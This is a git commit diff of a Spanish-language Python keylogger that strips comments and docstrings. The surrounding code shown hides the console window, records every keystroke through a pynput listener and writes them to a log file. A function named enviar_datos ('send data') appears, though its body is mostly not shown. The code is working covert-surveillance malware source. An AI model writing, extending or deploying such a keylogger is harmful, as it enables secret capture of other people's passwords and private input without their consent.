1429f4beb61c46575b1a643aa5e4e1a19017326b
Alejandro Arroyo <alecasta836@gmail.com>
2024-08-08 13:44:36 -0600

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -12,7 +12,6 @@ import win32gui
 ventana = win32console.GetConsoleWindow()
 win32gui.ShowWindow(ventana,0)
 
-# Lista para almacenar las teclas presionadas
 lista_tecla = []
 log_file = open('log.txt','w+')
 
@@ -34,31 +33,26 @@ def enviar_datos():
         pass
 
 def imprimir():
-    """Función para imprimir las teclas almacenadas."""
     teclas = ''.join(lista_tecla)
     log_file.write(teclas)
     log_file.write('\n')
     log_file.close()
 
 def convertir(key):
-    """Convierte la tecla a un formato específico (cadena de texto)."""
     try:
-        # Intenta obtener el carácter asociado a la tecla (si es alfanumérica)
         return key.char
     except AttributeError:
-        # Si no es un carácter, devuelve la representación de la tecla
         return str(key)
 
 def presiona(key):
-    """Función que se llama cuando se presiona una tecla."""
     key_str = convertir(key)
     
     if key_str == "Key.esc":
         print("Saliendo...")
         imprimir()
-        return False  # Detiene el listener
+        return False 
     elif key_str == "Key.space":
-        lista_tecla.append(' ')  # Agrega un espacio en blanco para Key.space
+        lista_tecla.append(' ')
     elif key_str == "Key.enter":
         lista_tecla.append('\n')
     elif key_str == 'Key.backspace':
@@ -71,7 +65,6 @@ def presiona(key):
         lista_tecla.append(key_str)
 
 def main():
-    """Función principal para iniciar la escucha de teclado."""
     with pynput.keyboard.Listener(on_press=presiona) as listener:
         listener.join()
 
